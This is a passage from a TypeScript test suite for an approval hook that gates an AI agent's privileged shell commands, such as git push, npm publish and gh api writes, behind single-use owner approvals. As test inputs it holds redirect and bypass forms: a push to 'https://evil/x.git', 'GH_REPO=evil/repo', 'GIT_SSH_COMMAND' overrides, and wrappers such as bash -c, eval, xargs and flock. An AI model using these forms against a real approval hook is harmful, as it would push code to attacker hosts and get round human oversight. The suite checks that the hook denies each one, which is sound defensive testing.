    assert.deepEqual(eventRows(fx, 'hook.decision').map(dataOf).map((d) => d['rule']), ['privileged:git.push']);
    assert.equal(eventRows(fx, 'approval.requested').length, 1);
  });
});

describe('tracer: an approval is spent only on the command the owner saw, run where they saw it (CR-03, FR-12, T-04-136)', () => {
  const p = profile();
  const elsewhere = join(realpathSync(p.roots.base), 'elsewhere');
  mkdirSync(elsewhere, { recursive: true });
  const plainPush = attendedCall('git push origin main');
  const plainPr = attendedCall('gh pr create --base main');
  const denies = (out: Attended): boolean => out.stdout !== '' && parsed(out.stdout).hookSpecificOutput.permissionDecision === 'deny';

  it('the owner approves the plain push and the plain pr create, from /tmp in session s1', async () => {
    for (const call of [plainPush, plainPr]) await approve(p.roots, hintOf(attendedHook(p.dataRoot, call)));
    assert.equal(approvalsOf(p.roots).length, 2);
    assert.ok(approvalsOf(p.roots).every((a) => a.consumed_at === null));
  });

  it('each redirected form is denied with a new request and leaves both approvals unconsumed', () => {
    const forms: Array<[string, Record<string, unknown>]> = [
      ['a git -c option that moves the remote', attendedCall('git -c remote.origin.url=https://evil/x.git push origin main')],
      ['a git -C option that moves the repository', attendedCall('git -C /other push origin main')],
      ['an assignment that changes the transport', attendedCall('GIT_SSH_COMMAND=x git push origin main')],
      ['an earlier cd', attendedCall('cd /x && git push origin main')],
      ['an assignment that redirects gh', attendedCall('GH_REPO=evil/repo gh pr create --base main')],
      ['the plain push from another directory', attendedCall('git push origin main', 's1', elsewhere)],
      ['the plain pr create from another directory', attendedCall('gh pr create --base main', 's1', elsewhere)],
    ];
    for (const [what, call] of forms) {
      const requests = eventsOf(p.roots, 'approval.requested').length;
      const out = attendedHook(p.dataRoot, call);
      assert.equal(out.code, 0, out.stderr);
      assert.ok(denies(out), `${what} was not denied`);
      assert.equal(eventsOf(p.roots, 'approval.requested').length, requests + 1, `${what}: no new request`);
      assert.ok(approvalsOf(p.roots).every((a) => a.consumed_at === null), `${what} took an approval`);
    }
    assert.equal(eventsOf(p.roots, 'action.started').length, 0);
  });

  it('the exact approved lines from /tmp are allowed once each', () => {
    for (const call of [plainPush, plainPr]) {
      const allowed = attendedHook(p.dataRoot, call);
      assert.deepEqual([allowed.code, allowed.stdout], [0, ''], allowed.stderr);
    }
    assert.ok(approvalsOf(p.roots).every((a) => a.consumed_at !== null));
    assert.ok(denies(attendedHook(p.dataRoot, plainPush)), 'the push approval was spent');
  });

  it('a directory that is a symbolic link is bound as the path it resolves to', async () => {
    const q = profile();
    const link = join(realpathSync(q.roots.base), 'tmp-link');
    symlinkSync(realpathSync('/tmp'), link);
    await approve(q.roots, hintOf(attendedHook(q.dataRoot, attendedCall('git push origin main', 's1', link))));
    const allowed = attendedHook(q.dataRoot, attendedCall('git push origin main', 's1', '/tmp'));
    assert.deepEqual([allowed.code, allowed.stdout], [0, ''], 'the link and the directory it names are one directory');
  });
});

describe('the approval request shows what it binds, and a value cut for display ends with an ellipsis (CR-03, FR-12 precision)', () => {
  const p = profile();
  const summaryOf = (call: Record<string, unknown>): { summary: string; digest: string } => {
    attendedHook(p.dataRoot, call);
    const rows = eventsOf(p.roots, 'approval.requested');
    const data = dataOf(rows[rows.length - 1] as EventDb);
    return { summary: data['paramsSummary'] as string, digest: data['paramsDigest'] as string };
  };

  it('shows gitOptions, env, the line digest and the directory', () => {
    const { summary } = summaryOf(attendedCall('FOO=1 git -c remote.origin.url=https://evil/x.git push origin main'));
    assert.match(summary, /gitOptions=-c remote\.origin\.url=https:\/\/evil\/x\.git/);
    assert.match(summary, /env=FOO=1/);
    assert.match(summary, /line=sha256:[0-9a-f]{32}/);
    assert.ok(summary.includes(`cwd=${realpathSync('/tmp')}`), summary);
  });

  it('cuts a long value with an ellipsis for display, and the digest still binds the whole value', () => {
    const head = `http.extraHeader=${'a'.repeat(100)}`;
    const one = summaryOf(attendedCall(`git -c ${head}1 push origin main`));
    const two = summaryOf(attendedCall(`git -c ${head}2 push origin main`));
    assert.match(one.summary, /gitOptions=-c http\.extraHeader=a+…/);
    assert.ok(!one.summary.includes(`${head}1`), 'the full value is not shown');
    assert.notEqual(one.digest, two.digest, 'the values differ only past the cut');
  });
});

describe('an attended call that needs a decision and has no usable directory fails closed (CR-03, FR-12)', () => {
  const p = profile();
  const bare = (command: string, cwd?: unknown): Record<string, unknown> => ({ session_id: 's1', hook_event_name: 'PreToolUse', ...(cwd === undefined ? {} : { cwd }), tool_name: 'Bash', tool_input: { command } });

  it('exits 2 for a privileged call with no cwd, a relative cwd, a cwd that is not a string and a cwd that does not exist', () => {
    for (const cwd of [undefined, 'relative/dir', 42, '', join(p.roots.base, 'no-such-dir')]) {
      const out = attendedHook(p.dataRoot, bare('git push origin main', cwd));
      assert.equal(out.code, 2, `${JSON.stringify(cwd)}: ${out.stdout}`);
      assert.match(out.stderr, /avarice hook:.*cwd/);
    }
  });

  it('exits 2 for an unparseable call without a usable cwd, and a file is not a directory', () => {
    assert.equal(attendedHook(p.dataRoot, bare('echo "unterminated')).code, 2);
    assert.equal(attendedHook(p.dataRoot, bare('echo "unterminated', 'relative')).code, 2);
    writeFileSync(join(p.roots.base, 'a-file'), 'x');
    assert.equal(attendedHook(p.dataRoot, bare('git push origin main', join(p.roots.base, 'a-file'))).code, 2);
  });

  it('does not need a cwd for a call that is not privileged, and records nothing for the refusals', () => {
    const none = attendedHook(p.dataRoot, bare('ls'));
    assert.deepEqual([none.code, none.stdout], [0, '']);
    assert.equal(ledgerRows<{ n: number }>(p.roots, 'SELECT count(*) AS n FROM events')[0]?.n, 0);
    assert.equal(approvalsOf(p.roots).length, 0);
  });
});

describe('a push started through a shell string, eval or a wrapper is denied like the push itself (WR-01, WR-03, T-04-137)', () => {
  const p = profile();
  const rule = (out: Attended): string => (out.stdout === '' ? 'allow' : /^avarice: ([^:]+:[^:]+|[^:]+):/.exec(parsed(out.stdout).hookSpecificOutput.permissionDecisionReason)?.[1] ?? 'deny');

  it('denies each as the privileged action it starts, with a request', () => {
    const cases: Array<[string, string]> = [
      ['bash -c "git push origin main"', 'privileged:git.push'],
      ["sh -c 'npm publish'", 'privileged:release.publish'],
      ['eval "git push"', 'privileged:git.push'],
      ['timeout 5 git push', 'privileged:git.push'],
      ['xargs git push', 'privileged:git.push'],
      ['setsid git push', 'privileged:git.push'],
      ['stdbuf -o0 git push', 'privileged:git.push'],
      ['ionice -c3 git push', 'privileged:git.push'],
      ['flock /tmp/l git push', 'privileged:git.push'],
      ["flock /tmp/l -c 'git push'", 'privileged:git.push'],
      ['npm --scope @x publish', 'privileged:release.publish'],
      ['npm --fetch-retries 3 publish', 'privileged:release.publish'],
      ['npm --cwd pkg publish', 'privileged:release.publish'],
    ];
    for (const [command, expected] of cases) {
      const before = eventsOf(p.roots, 'approval.requested').length;
      const out = attendedHook(p.dataRoot, attendedCall(command));
      assert.equal(rule(out), expected, command);
      assert.equal(eventsOf(p.roots, 'approval.requested').length, before + 1, command);
    }
  });

  it('allows a computed shell string, and a command that only has publish as an argument, without a decision', () => {
    for (const command of ['bash -c "$X"', 'sh -c "$(cat f)"', 'npm install publish', 'npm view publish']) {
      const out = attendedHook(p.dataRoot, attendedCall(command));
      assert.deepEqual([out.code, out.stdout], [0, ''], command);
    }
  });
});

describe('a gh api body that comes from a file or standard input is refused, not approved blind (WR-04, T-04-138)', () => {
  const p = profile();
  const UNAPPROVABLE = ['gh api graphql -F query=@q.graphql', 'gh api repos/o/r/issues --input body.json', 'gh api repos/o/r/issues -F body=@-', 'gh api repos/o/r/issues --field body=@body.txt', 'gh api repos/o/r/issues --input=body.json'];

  it('denies each with privileged:unapprovable and a reason that says to pass the fields inline, with no request and one policy.denied', () => {
    for (const command of UNAPPROVABLE) {
      const denied = eventsOf(p.roots, 'policy.denied').length;
      const out = attendedHook(p.dataRoot, attendedCall(command));
      assert.equal(out.code, 0, out.stderr);
      const reason = parsed(out.stdout).hookSpecificOutput.permissionDecisionReason;
      assert.equal(parsed(out.stdout).hookSpecificOutput.permissionDecision, 'deny', command);
      assert.match(reason, /^avarice: privileged:unapprovable: /, command);
      assert.match(reason, /file or standard input/);
      assert.match(reason, /inline/);
      assert.ok(!/avarice approve/.test(reason), 'no approval is offered');
      assert.equal(eventsOf(p.roots, 'policy.denied').length, denied + 1, command);
    }
    assert.equal(eventsOf(p.roots, 'approval.requested').length, 0);
    assert.equal(approvalsOf(p.roots).length, 0);
    const last = dataOf(eventsOf(p.roots, 'policy.denied').slice(-1)[0] as EventDb);
    assert.equal(last['ruleId'], 'privileged:unapprovable');
    assert.equal(last['scope'], 'attended:s1');
    assert.equal(last['action'], 'scm.api.write');
  });

  it('a line with one unapprovable command and one approvable command consumes nothing and is denied as unapprovable', async () => {
    const q = profile();
    await approve(q.roots, hintOf(attendedHook(q.dataRoot, attendedCall('git push origin main'))));
    const out = attendedHook(q.dataRoot, attendedCall('git push origin main && gh api repos/o/r/issues --input body.json'));
    assert.match(parsed(out.stdout).hookSpecificOutput.permissionDecisionReason, /^avarice: privileged:unapprovable: /);
    assert.equal((approvalsOf(q.roots)[0] as ApprovalDb).consumed_at, null, 'the approval of the push was not spent');
    assert.equal(eventsOf(q.roots, 'action.started').length, 0);
    assert.equal(eventsOf(q.roots, 'approval.requested').length, 1, 'no request was minted for the push on that line');
    assert.equal(eventsOf(q.roots, 'policy.denied').length, 1, 'one denial, for the unapprovable command');
  });

  it('an inline field is approvable, and two different inline queries have different digests', () => {
    const q = profile();
    const one = attendedHook(q.dataRoot, attendedCall("gh api graphql -f query='mutation { a }'"));
    const two = attendedHook(q.dataRoot, attendedCall("gh api graphql -f query='mutation { b }'"));
    assert.match(parsed(one.stdout).hookSpecificOutput.permissionDecisionReason, /^avarice: privileged:scm\.api\.write: /);
    assert.notEqual(hintOf(one), hintOf(two));
    const requested = eventsOf(q.roots, 'approval.requested').map((row) => dataOf(row)['paramsDigest']);
    assert.equal(requested.length, 2);
    assert.notEqual(requested[0], requested[1]);
    assert.equal(eventsOf(q.roots, 'policy.denied').map((row) => dataOf(row)['ruleId']).includes('privileged:unapprovable'), false);
  });

  it('in a run the same forms are still denied as privileged:scm.api.write', () => {
    for (const command of UNAPPROVABLE) {
      const fx = fixture();
      const result = runHook(fx, 'pre', bash(command));
      assert.equal(result.code, 0, result.stderr);
      assert.match(parsed(result.stdout).hookSpecificOutput.permissionDecisionReason, /^avarice: privileged:scm\.api\.write: /, command);
    }
  });
});

describe('attended mode fails closed (CON-3)', () => {
  const p = profile();

  it('exits 2 when a privileged form meets a store that is missing, unreadable or not a database', () => {
    const missing = attendedHook(join(p.roots.base, 'no-such-data'), attendedCall('git push origin main'));
    assert.equal(missing.code, 2);
    const junk = join(p.roots.base, 'junk');
    mkdirSync(junk, { recursive: true });
    writeFileSync(join(junk, 'state.db'), 'this is not a database');
    const broken = attendedHook(junk, attendedCall('git push origin main'));
    assert.equal(broken.code, 2);
    assert.match(broken.stderr, /avarice hook:/);
  });

  it('exits 2 for input and arguments it cannot judge', () => {
    assert.equal(attendedHook(p.dataRoot, 'not json').code, 2);
    assert.equal(attendedHook(p.dataRoot, '[1]').code, 2);
    assert.equal(attendedHook(p.dataRoot, { session_id: 's1', tool_input: {} }).code, 2, 'no tool name');
    assert.equal(attendedHook(p.dataRoot, { session_id: 's1', tool_name: 'Bash', tool_input: {} }).code, 2, 'a shell call with no command');
    assert.equal(attendedHook(p.dataRoot, { tool_name: 'Bash', tool_input: { command: 'git push origin main' } }).code, 2, 'a privileged form with no session');
    assert.equal(attendedHook(p.dataRoot, attendedCall('git push origin main', 'bad session/id')).code, 2, 'a session ID that is not a plain token');
    assert.equal(attendedHook(null, attendedCall('ls')).code, 2, 'no --data-root');
    assert.equal(attendedHook('relative/dir', attendedCall('ls')).code, 2, 'a relative --data-root');
    assert.equal(attendedHook(p.dataRoot, attendedCall('ls'), []).code, 2, 'no --event');
    assert.equal(attendedHook(p.dataRoot, attendedCall('ls'), ['--event', 'pre', '--policy', '/tmp/x.json']).code, 2, 'both modes');
  });

  it('does not open the store for a call that is not privileged', () => {
    const none = attendedHook(join(p.roots.base, 'no-such-data'), attendedCall('ls'));
    assert.deepEqual([none.code, none.stdout], [0, '']);
  });

  it('writes nothing for a refused call', () => {
    assert.equal(ledgerRows<{ n: number }>(p.roots, 'SELECT count(*) AS n FROM events')[0]?.n, 0);
    assert.equal(approvalsOf(p.roots).length, 0);
  });
});

describe('avarice install-host writes the attended hook entry beside the skill (FR-12, T-04-52)', () => {
  const entryOf = (settings: { hooks?: { PreToolUse?: Array<{ matcher?: string; hooks: Array<{ command: string }> }> } }): Array<{ matcher?: string; hooks: Array<Record<string, unknown>> }> =>
    (settings.hooks?.PreToolUse ?? []).filter((e) => e.hooks.some((h) => h.command.includes(ATTENDED_HOOK_MARKER))) as Array<{ matcher?: string; hooks: Array<Record<string, unknown>> }>;
  const read = (claude: string): string => readFileSync(join(claude, 'settings.json'), 'utf8');
  const install = (p: { roots: CliRoots; claude: string }, argv: readonly string[] = []): ReturnType<typeof runCli> =>
    runCli(['install-host', ...argv], { roots: p.roots, entry: PRODUCTION_ENTRY, env: { CLAUDE_CONFIG_DIR: p.claude } });

  const unrelated = { matcher: 'Bash', hooks: [{ type: 'command', command: '/usr/local/bin/my-guard --strict' }] };
  const userSettings = { model: 'opus', permissions: { allow: ['Read'], deny: ['WebFetch'] }, hooks: { PostToolUse: [{ matcher: '.*', hooks: [{ type: 'command', command: 'notify' }] }], PreToolUse: [unrelated] }, env: { A: '1' } };

  it('writes one PreToolUse entry for Bash that runs the hook entry with --attended, the marker and the profile data root, with mode 0600', () => {
    const p = profile();
    const out = install(p);
    assert.equal(out.code, 0, out.stderr);
    assert.match(out.stdout, /^skill avarice-run: installed$/m);
    assert.match(out.stdout, /^hook attended: installed$/m);
    const settings = JSON.parse(read(p.claude)) as Parameters<typeof entryOf>[0];
    const entries = entryOf(settings);
    assert.equal(entries.length, 1);
    const [entry] = entries;
    assert.ok(entry);
    assert.equal(entry.matcher, 'Bash');
    assert.equal(entry.hooks.length, 1);
    const hook = entry.hooks[0] as Record<string, unknown>;
    assert.equal(hook['type'], 'command');
    assert.equal(hook['timeout'], 5);
    const command = String(hook['command']);
    assert.ok(command.includes(HOOK_ENTRY), command);
    assert.ok(command.includes('--event pre'), command);
    assert.ok(command.includes('--attended'), command);
    assert.ok(command.includes(ATTENDED_HOOK_MARKER), command);
    assert.ok(command.includes(`--data-root ${p.dataRoot}`), command);
    assert.equal(statSync(join(p.claude, 'settings.json')).mode & 0o777, 0o600);
  });

  it('the command it wrote runs the real hook: a privileged form is denied through the installed command line', () => {
    const p = profile();
    install(p);
    const settings = JSON.parse(read(p.claude)) as Parameters<typeof entryOf>[0];
    const command = String(((entryOf(settings)[0] as { hooks: Array<Record<string, unknown>> }).hooks[0] as Record<string, unknown>)['command']);
    const env = { ...process.env };
    delete env['NODE_TEST_CONTEXT'];
    const ran = spawnSync('/bin/sh', ['-c', command], { input: JSON.stringify(attendedCall('git push origin main')), encoding: 'utf8', env, timeout: 30_000 });
    assert.equal(ran.status, 0, ran.stderr);
    assert.match(ran.stdout, /privileged:git\.push/);
  });

  it('a second run reports unchanged and does not rewrite the file', () => {
    const p = profile();
    install(p);
    const file = join(p.claude, 'settings.json');
    const old = new Date(Date.now() - 3_600_000);
    utimesSync(file, old, old);
    const before = read(p.claude);
    const again = install(p);
    assert.equal(again.code, 0, again.stderr);
    assert.match(again.stdout, /^hook attended: unchanged$/m);
    assert.equal(read(p.claude), before);
    assert.equal(Math.round(statSync(file).mtimeMs / 1000), Math.round(old.getTime() / 1000), 'the mtime did not move');
  });

  it('records the digest of the entry as the adapter config host-hook:attended', () => {
    const p = profile();
    install(p);
    const rows = ledgerRows<{ port: string; adapter: string; config_digest: string; descriptor_json: string }>(p.roots, "SELECT * FROM adapter_configs WHERE name = 'host-hook:attended'");
    assert.equal(rows.length, 1);
    const settings = JSON.parse(read(p.claude)) as Parameters<typeof entryOf>[0];
    assert.equal((rows[0] as { config_digest: string }).config_digest, digestOf(entryOf(settings)[0]));
    assert.match((rows[0] as { config_digest: string }).config_digest, /^sha256:[0-9a-f]{64}$/);
  });

  it('keeps every other key and every entry without the marker byte for byte, and the indentation of the file', () => {
    const p = profile();
    mkdirSync(p.claude, { recursive: true });
    const original = JSON.stringify(userSettings, null, 4) + '\n';
    writeFileSync(join(p.claude, 'settings.json'), original, { mode: 0o640 });
    const out = install(p);
    assert.equal(out.code, 0, out.stderr);
    const text = read(p.claude);
    const after = JSON.parse(text) as typeof userSettings & { hooks: { PreToolUse: unknown[] } };
    assert.equal(JSON.stringify(after.hooks.PreToolUse[0]), JSON.stringify(unrelated), 'the unrelated entry is the same bytes');
    assert.equal(after.hooks.PreToolUse.length, 2);
    assert.equal(JSON.stringify(after.hooks.PostToolUse), JSON.stringify(userSettings.hooks.PostToolUse));
    assert.equal(JSON.stringify({ ...after, hooks: undefined }), JSON.stringify({ ...userSettings, hooks: undefined }));
    assert.ok(text.startsWith('{\n    "model"'), 'the four-space indentation is kept');
    assert.ok(text.endsWith('}\n'));
    assert.equal(statSync(join(p.claude, 'settings.json')).mode & 0o777, 0o640, 'the file mode is kept');
  });

  it('replaces only the entry that carries the marker when its command is out of date, and says updated', () => {
    const p = profile();
    mkdirSync(p.claude, { recursive: true });
    const stale = { matcher: 'Bash', hooks: [{ type: 'command', command: `/old/node /old/hook.ts --event pre --attended ${ATTENDED_HOOK_MARKER} --data-root /old/data` }] };
    writeFileSync(join(p.claude, 'settings.json'), JSON.stringify({ hooks: { PreToolUse: [unrelated, stale] } }, null, 2) + '\n');
    const out = install(p);
    assert.equal(out.code, 0, out.stderr);
    assert.match(out.stdout, /^hook attended: updated$/m);
    const after = JSON.parse(read(p.claude)) as { hooks: { PreToolUse: Array<{ hooks: Array<{ command: string }> }> } };
    assert.equal(after.hooks.PreToolUse.length, 2);
    assert.equal(JSON.stringify(after.hooks.PreToolUse[0]), JSON.stringify(unrelated));
    assert.ok((after.hooks.PreToolUse[1] as { hooks: Array<{ command: string }> }).hooks[0]?.command.includes(`--data-root ${p.dataRoot}`));
    assert.ok(!read(p.claude).includes('/old/data'));
  });

  it('refuses a symbolic link at settings.json (exit 3) and writes nothing through it', () => {
    const p = profile();
    mkdirSync(p.claude, { recursive: true });
    const target = join(p.roots.base, 'real-settings.json');
    writeFileSync(target, '{}\n');
    symlinkSync(target, join(p.claude, 'settings.json'));
    const out = install(p);
    assert.equal(out.code, 3, out.stderr);
    assert.equal(readFileSync(target, 'utf8'), '{}\n');
    assert.ok(lstatSync(join(p.claude, 'settings.json')).isSymbolicLink());
  });

  it('refuses a settings.json it cannot read as an object with the hook structure, and leaves it as it was', () => {
    for (const body of ['not json', '[1]', '{"hooks": []}', '{"hooks": {"PreToolUse": {}}}', '{"hooks": {"PreToolUse": [3]}}', '']) {
      const p = profile();
      mkdirSync(p.claude, { recursive: true });
      writeFileSync(join(p.claude, 'settings.json'), body);
      const out = install(p);
      assert.equal(out.code, 3, `${JSON.stringify(body)}: ${out.stderr}`);
      assert.equal(read(p.claude), body);
    }
  });

  it('refuses an entry that mixes the marker with a command that is not AVARICE', () => {
    const p = profile();
    mkdirSync(p.claude, { recursive: true });
    const mixed = JSON.stringify({ hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'other' }, { type: 'command', command: `x ${ATTENDED_HOOK_MARKER}` }] }] } });
    writeFileSync(join(p.claude, 'settings.json'), mixed);
    const out = install(p);
    assert.equal(out.code, 3, out.stderr);
    assert.equal(read(p.claude), mixed);
  });

  it('leaves no temporary file beside settings.json', () => {
    const p = profile();
    install(p);
    assert.deepEqual(readdirSync(p.claude).sort(), ['settings.json', 'skills']);
  });
});
